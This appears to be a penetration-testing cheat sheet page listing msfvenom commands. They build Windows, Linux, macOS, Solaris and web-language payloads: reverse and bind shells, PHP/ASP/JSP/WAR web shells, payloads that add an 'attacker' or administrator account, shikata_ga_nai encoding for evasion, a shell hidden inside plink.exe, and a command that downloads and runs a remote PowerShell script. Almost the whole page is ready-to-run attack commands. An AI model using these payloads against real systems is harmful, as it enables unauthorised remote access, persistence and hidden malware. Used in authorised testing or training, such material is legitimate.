---
title: "MSFVenom Shells"
draft: false
description: "Some useful msfvenom shells"
lead: "Some useful msfvenom shells"
images: []
menu:
  docs:
    parent: "Shells"
weight: 3
toc: true
---

## Windows

### <span style="color:#b31d36"> Reverse Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### <span style="color:#b31d36"> Bind Shell
```
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### <span style="color:#b31d36"> Create User
```
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### <span style="color:#b31d36"> CMD Shell
```
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### <span style="color:#b31d36"> Execute Command
```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
```
```
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### <span style="color:#b31d36"> Encoder
```
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### <span style="color:#b31d36"> Embedded inside executable
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```

---
## Linux Payloads
### <span style="color:#b31d36"> Reverse Shell
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
```
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### <span style="color:#b31d36"> Bind Shell
```
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### <span style="color:#b31d36"> SunOS (Solaris)
```
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
---
## MAC Payloads
### <span style="color:#b31d36"> Reverse Shell
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### <span style="color:#b31d36"> Bind Shell
```
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
---
## Web Based Payloads
### <span style="color:#b31d36"> PHP
### <span style="color:#b31d36"># Reverse shell
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
```
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### <span style="color:#b31d36"> ASP/x
### <span style="color:#b31d36"># Reverse shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
```
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### <span style="color:#b31d36"> JSP
### <span style="color:#b31d36"># Reverse shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### <span style="color:#b31d36"> WAR
### <span style="color:#b31d36"># Reverse Shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### <span style="color:#b31d36"> NodeJS
```
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
---
## Script Language payloads
### <span style="color:#b31d36"> Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### <span style="color:#b31d36"> Python
```
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### <span style="color:#b31d36"> Bash
```
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw
```